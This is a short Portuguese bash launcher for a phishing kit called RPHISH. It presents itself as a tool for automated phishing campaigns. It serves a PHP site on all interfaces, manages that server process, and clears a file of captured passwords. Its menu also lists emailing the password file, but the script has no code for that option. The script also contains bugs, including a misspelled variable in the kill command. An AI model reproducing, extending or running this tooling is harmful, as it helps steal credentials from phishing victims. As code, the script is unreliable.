#!/bin/bash
clear
echo ""
echo "Seja bem-vindo ao RPHISH, sua ferramenta para campanhas automatizadas de phishing!"
echo ""
sleep 2
echo "by: Raul Pazemecxas de Andrade"
echo ""
echo "Linkedin: "
echo ""
echo "GitHub: "
sleep 3
echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo ""
cat<<"EOF"
 ________      ________    ___  ___      ___      ________       ___  ___     
|\   __  \    |\   __  \  |\  \|\  \    |\  \    |\   ____\     |\  \|\  \    
\ \  \|\  \   \ \  \|\  \ \ \  \\\  \   \ \  \   \ \  \___|_    \ \  \\\  \   
 \ \   _  _\   \ \   ____\ \ \   __  \   \ \  \   \ \_____  \    \ \   __  \  
  \ \  \\  \|   \ \  \___|  \ \  \ \  \   \ \  \   \|____|\  \    \ \  \ \  \ 
   \ \__\\ _\    \ \__\      \ \__\ \__\   \ \__\    ____\_\  \    \ \__\ \__\
    \|__|\|__|    \|__|       \|__|\|__|    \|__|   |\_________\    \|__|\|__|
                                                    \|_________|              
                                                                              
EOF

echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo "O IPV4 local é: $(hostname -I)"

cat <<"EOF"

MENU:

	[1] INICIAR WEB-SERVER
	[2] SAIR DO SCRIPT
	[3] VISUALIZAR E ELIMINAR O PROCESSO
	[4] LIMPAR O ARQUIVO DE SENHAS (APAGA TODO CONTEUDO)
	[5] ENVIAR ARQUIVO .TXT POR E-MAIL COM PYTHON3
 
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Escolha uma  opção: 
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

EOF
echo ""

sleep 2
read i

	case "$i" in
		1)
			php -S 0.0.0.0:8080
	;;
		2)
			echo "Muito obrigado por utilizar o RPHISH!" ; break
	;;
		3)
			echo "Processo do web server: " ; echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-" ; ps aux | egrep "*php"
			echo "Qual o PID do processo? :"
			read pid_process
			kill $pid_proces
	;;
		4)
			echo "" > sua-senha.txt
			exit
clear
	esac



